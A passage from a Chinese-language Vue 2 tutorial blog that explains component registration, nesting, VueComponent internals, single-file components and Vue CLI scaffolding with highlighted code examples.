class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root1&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- &lt;student&gt;&lt;/student&gt; --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> school = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">extend</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">template</span>: <span class="hljs-string">`&lt;div class=&quot;demo&quot;&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h2&gt;学校名称：&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">    &lt;/div&gt;`</span>,</span><br><span class="language-javascript">            <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">schoolName</span>: <span class="hljs-string">&#x27;家里蹲大学&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;china&#x27;</span></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">showName</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">                    <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">schoolName</span>)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> student = &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">template</span>: <span class="hljs-string">`</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h2&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">    &lt;/div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">`</span>,</span><br><span class="language-javascript">            <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;xyy&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">//第一步：创建hello组件</span></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> hello = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">extend</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">template</span>: <span class="hljs-string">`</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h3&gt;你好啊！&#123;&#123;name&#125;&#125;&lt;/h3&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">  &lt;/div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">`</span>,</span><br><span class="language-javascript">            <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;cess&#x27;</span></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">//第二步：全局注册组件</span></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;hello&#x27;</span>, hello)</span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;student&#x27;</span>, student)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> v1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// name:&#x27;不会敲代码！&#x27;</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">                school,</span><br><span class="language-javascript">                <span class="hljs-comment">// student</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> v2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root1&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;不会敲代码！&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="几个注意点-："><a href="#几个注意点-：" class="headerlink" title="几个注意点 ："></a><strong>几个注意点 ：</strong></h4><p>关于组件名：</p><p>一个单词组成：</p><ul><li>第一种写法(首字母小写)：school</li><li>第二种写法(首字母大写)：School</li></ul><p>多个单词组成：</p><ul><li>第一种写法(kebab-case命名)：my-school</li><li>第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)</li></ul><blockquote><p>备注：</p><p>(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。</p><p>(2).可以使用name配置项指定组件在开发者工具中呈现的名字。</p></blockquote><p>关于组件标签:</p><ul><li><p>第一种写法：<school></school></p></li><li><p>第二种写法：<school/>（需要Vue脚手架支持）</p></li></ul><blockquote><p>备注：不使用脚手架时，<school/>会导致后续组件不能渲染</p></blockquote><p>一个简写方式：const school &#x3D; Vue.extend(options)可简写为const school &#x3D; options，因为父组件components引入的时候会自动创建</p><blockquote><p>备注:使用组件标签得时候一定要放入被Vue管理的DOM中去</p></blockquote><h3 id="组件的嵌套"><a href="#组件的嵌套" class="headerlink" title="组件的嵌套"></a>组件的嵌套</h3><p>比较简单，直接展示代码：</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>组件的嵌套<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">  Vue.config.productionTip = false</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //定义student组件</span></span><br><span class="language-xml"><span class="language-handlebars">  const student = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    name: &#x27;student&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    template: `</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>学生姓名：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>学生年龄：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">age</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">    data() &#123;return &#123;name: &#x27;尚硅谷&#x27;,age: 18&#125;&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //定义school组件</span></span><br><span class="language-xml"><span class="language-handlebars">  const school = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    name: &#x27;school&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    template: `</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>学校名称：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>学校地址：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">    data() &#123;return &#123;name: &#x27;尚硅谷&#x27;,address: &#x27;北京&#x27;&#125;&#125;,</span></span><br><span class="language-xml"><span class="language-handlebars">    //注册组件（局部）</span></span><br><span class="language-xml"><span class="language-handlebars">    components: &#123; student &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //定义hello组件</span></span><br><span class="language-xml"><span class="language-handlebars">  const hello = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    template: `<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">msg</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>`,</span></span><br><span class="language-xml"><span class="language-handlebars">    data() &#123;return &#123;msg: &#x27;欢迎来到尚硅谷学习！&#x27;&#125;&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //定义app组件</span></span><br><span class="language-xml"><span class="language-handlebars">  const app = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    template: `</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">    components: &#123; school, hello &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //创建vm</span></span><br><span class="language-xml"><span class="language-handlebars">  new Vue(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    el: &#x27;#root&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    template: &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">app</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">app</span>&gt;</span>&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    //注册组件（局部）</span></span><br><span class="language-xml"><span class="language-handlebars">    components: &#123; app &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="VueComponent"><a href="#VueComponent" class="headerlink" title="VueComponent"></a>VueComponent</h3><ul><li>school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。</li><li>我们只需要写或，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。</li><li>特别注意：每次调用Vue.extend，返回的都是一个&#x3D;&#x3D;全新的VueComponent&#x3D;&#x3D;！！！！(这个VueComponent可不是实例对象)</li><li>关于this指向：<ul><li>组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。</li><li>new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。</li></ul></li><li>VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm。</li></ul><p>Vue 在哪管理 VueComponent</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124121234720.png" alt="image-20221124121234720"></p><h3 id="一个重要的内置关系"><a href="#一个重要的内置关系" class="headerlink" title="一个重要的内置关系"></a>一个重要的内置关系</h3><ul><li>一个重要的内置关系：VueComponent.prototype. <strong>proto</strong> &#x3D;&#x3D;&#x3D; Vue.prototype</li><li>为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。</li></ul><p>好像继承</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124121316145.png" alt="image-20221124121316145"></p><h2 id="1-21-单文件组件"><a href="#1-21-单文件组件" class="headerlink" title="1.21 单文件组件"></a>1.21 单文件组件</h2><p>单文件组件就是将一个组件的代码写在 .vue 这种格式的文件中，webpack 会将 .vue 文件解析成 html,css,js这些形式。</p><p>来做个单文件组件的案例：</p><p><strong>School.vue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset=&quot;UTF-8&quot; /&gt;<br>&lt;title&gt;练习一下单文件组件的语法&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;!-- 准备一个容器 --&gt;<br>&lt;div id=&quot;root&quot;&gt;&lt;/div&gt;<br>        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;<br>&lt;script type=&quot;text/javascript&quot; src=&quot;./main.js&quot;&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p><strong>Student.vue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;<br>        &lt;h2&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    export default &#123;<br>        name: &#x27;Student&#x27;,<br>        data() &#123;<br>            return &#123;<br>                name: &#x27;xyy&#x27;,<br>                age: 18<br>            &#125;<br>        &#125;,<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p><strong>App.vue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>    &lt;School&gt;&lt;/School&gt;<br>    &lt;Student&gt;&lt;/Student&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    import School from &#x27;./school.vue&#x27;<br>    import Student from &#x27;./Student.vue&#x27;<br>    export default &#123;<br>        name: &#x27;App&#x27;,<br>        components: &#123;<br>            School,<br>            Student<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p><strong>main.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,<br>    <span class="hljs-attr">template</span>: <span class="hljs-string">`&lt;App&gt;&lt;/App&gt;`</span>,<br>    <span class="hljs-attr">components</span>: &#123;<br>        <span class="hljs-title class_">App</span><br>    &#125;,<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>index.htm</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>练习一下单文件组件的语法<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 准备一个容器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="2-vue脚手架，自定义事件，插槽等复杂内容"><a href="#2-vue脚手架，自定义事件，插槽等复杂内容" class="headerlink" title="2. vue脚手架，自定义事件，插槽等复杂内容"></a>2. vue脚手架，自定义事件，插槽等复杂内容</h1><h2 id="2-1-初始化脚手架"><a href="#2-1-初始化脚手架" class="headerlink" title="2.1 初始化脚手架"></a>2.1 初始化脚手架</h2><p> 2.1.1. 说明 </p><ol><li><p>Vue脚手架是Vue官方提供的标准化开发工具（开发平台）</p></li><li><p>最新的版本是 4.x</p></li><li><p>文档 <a href="https://cli.vuejs.org/zh/">Vue CLI</a></p></li></ol><p> 2.1.2. 具体步骤 </p><ol><li><p>如果下载缓慢请配置npm淘宝镜像<code>npm config set registry http://registry.npm.taobao.org</code></p></li><li><p>全局安装 @vue&#x2F;cli <code>npm install -g @vue/cli</code></p></li><li><p>切换到创建项目的目录，使用命令创建项目<code>vue create xxx</code></p></li><li><p>选择使用vue的版本</p></li><li><p>启动项目<code>npm run serve</code></p></li><li><p>打包项目<code>npm run build</code></p></li><li><p>暂停项目 Ctrl+C</p></li></ol><p>Vue脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack配置，请执行<br>vue inspect &gt; output.js</p><h3 id="脚手架文件结构"><a href="#脚手架文件结构" class="headerlink" title="脚手架文件结构"></a>脚手架文件结构</h3>   <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">├── node_modules <br>├── public<br>│   ├── favicon<span class="hljs-selector-class">.ico</span>: 页签图标<br>│   └── index<span class="hljs-selector-class">.html</span>: 主页面<br>├── <span class="hljs-attribute">src</span><br>│   ├── assets: 存放静态资源<br>│   │   └── logo<span class="hljs-selector-class">.png</span><br>│   │── component: 存放组件<br>│   │   └── HelloWorld<span class="hljs-selector-class">.vue</span><br>│   │── App<span class="hljs-selector-class">.vue</span>: 汇总所有组件<br>│   │── <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.js</span>: 入口文件<br>├── <span class="hljs-selector-class">.gitignore</span>: git版本管制忽略的配置<br>├── babel<span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.js</span>: babel的配置文件<br>├── package<span class="hljs-selector-class">.json</span>: 应用包配置文件 <br>├── README<span class="hljs-selector-class">.md</span>: 应用描述文件<br>├── package-lock.json：包版本控制文件<br><br></code></pre></td></tr></table></figure><h3 id="脚手架demo"><a href="#脚手架demo" class="headerlink" title="脚手架demo"></a>脚手架demo</h3><p>components:</p><p>就直接把单文件组件的 School.vue 和 Student.vue 两个文件直接拿来用，不需要修改。</p><p>App.vue:</p><p>引入这两个组件，注册一下这两个组件，再使用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Vue logo&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./assets/logo.png&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Student</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">School</span>&gt;</span><span class="hljs-tag">&lt;/<span 